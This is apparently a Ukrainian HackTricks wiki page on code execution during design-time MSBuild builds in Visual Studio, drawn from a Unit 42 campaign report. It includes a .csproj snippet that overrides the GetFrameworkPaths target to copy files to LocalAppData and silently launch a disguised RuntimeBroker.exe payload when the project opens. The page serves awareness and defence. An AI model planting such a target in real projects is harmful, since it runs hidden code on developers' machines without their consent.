# Виконання MSBuild під час проєктування проєкту Visual Studio

{{#include ../banners/hacktricks-training.md}}

Відкриття проєкту C# у Visual Studio — це не пасивне читання. Його збірка під час проєктування викликає іменовані цілі MSBuild, щоб ініціалізувати IntelliSense, посилання та налагодження **до того**, як розробник вибере Build або Run. `GetFrameworkPaths` — одна з таких цілей. Проєкт, який перевизначає її, може виконати код у контексті користувача під час завантаження проєкту — без окремого натискання на payload.<sup>[[1]](#references)[[2]](#references)</sup>

У описаному проєкті оголошувалися файли ресурсів, а потім у перевизначеній цілі використовувалися `MakeDir`, `Copy` та `Exec`, щоб підготувати й запустити розміщений поруч payload. Цей скорочений фрагмент зберігає шлях виконання, показаний на рисунку 6 у джерелі; він має бути всередині `.csproj`, а не в окремому XML-файлі.<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**Порядок імпорту має значення:** MSBuild використовує *останнє* визначення цілі. Немає гарантії, що ціль, записана у файлі проєкту, замінить ціль Microsoft, якщо пізніший імпорт перевизначить її. Проєкти у стилі SDK з `<Project Sdk="...">` неявно імпортують цілі SDK після тіла проєкту, тому перевірте фактичний порядок імпорту, а не припускайте, що таке перевизначення працюватиме в кожному проєкті. `MSBuild.exe -preprocess:expanded.xml project.csproj` розгортає імпорти без збирання проєкту й може допомогти знайти ефективне визначення цілі.<sup>[[3]](#references)[[4]](#references)</sup>

Це поверхня виконання коду в проєкті розробника, а не встановлення розширення VSIX і не підвищення привілеїв саме по собі. Якщо підготовлений виконуваний файл використовує шкідливий суміжний файл `.exe.config` або DLL, продовжуйте з [AppDomainManager hijacking and DLL sideloading](windows-local-privilege-escalation/dll-hijacking/).

## References

- [1] [Unit 42 — Кампанія Blinder Tunnel націлена на критичну інфраструктуру Іраку](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn — Інтеграція з Visual Studio (MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn — Цілі MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn — Довідник командного рядка MSBuild](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)
{{#include ../banners/hacktricks-training.md}}
